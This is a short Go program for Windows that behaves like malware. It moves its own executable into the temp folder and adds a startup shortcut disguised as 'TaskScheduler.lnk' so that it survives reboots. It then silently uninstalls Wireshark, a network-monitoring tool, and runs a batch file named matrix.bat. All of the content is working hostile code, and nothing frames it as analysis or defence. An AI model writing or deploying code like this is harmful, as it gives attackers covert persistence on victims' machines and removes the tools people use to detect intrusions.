package main

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"time"
)

func main() {
	time.Sleep(2 * time.Second)

	tmpDir := os.TempDir()

	exePath, err := os.Executable()
	if err != nil {
		panic(err.Error())
	}

	newExePath := filepath.Join(tmpDir, filepath.Base(exePath))
	err = os.Rename(exePath, newExePath)
	if err != nil {
		panic(err.Error())
	}

	userConfigDir, err := os.UserConfigDir()
	if err != nil {
		panic(err.Error())
	}

	startupDir := filepath.Join(userConfigDir, "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
	shortcutPath := filepath.Join(startupDir, "TaskScheduler.lnk")
	cmd := exec.Command("powershell", "-Command", fmt.Sprintf(`$s=(New-Object -COM WScript.Shell).CreateShortcut('%s');$s.TargetPath='%s';$s.WorkingDirectory='%s';$s.Save()`, shortcutPath, newExePath, filepath.Dir(newExePath)))
	err = cmd.Run()
	if err != nil {
		panic(err.Error())
	}

	// Path to the uninstaller executable
	uninstallerPath := "C:\\Program Files\\Wireshark\\uninstall.exe"

	// Command to uninstall Wireshark silently
	uninstall := exec.Command(uninstallerPath, "/S")

	// Run the command
	uninstallErr := uninstall.Run()
	if uninstallErr != nil {
		fmt.Printf("Failed to uninstall Wireshark: %v\n", uninstallErr)
		return
	}

	fmt.Println("Wireshark uninstalled successfully.")

	// Run matrix.bat
	matrixCmd := exec.Command("cmd", "/C", "start", "matrix.bat")
	matrixErr := matrixCmd.Run()
	if matrixErr != nil {
		fmt.Printf("Failed to run matrix.bat: %v\n", matrixErr)
		return
	}

	fmt.Println("matrix.bat executed successfully.")
}
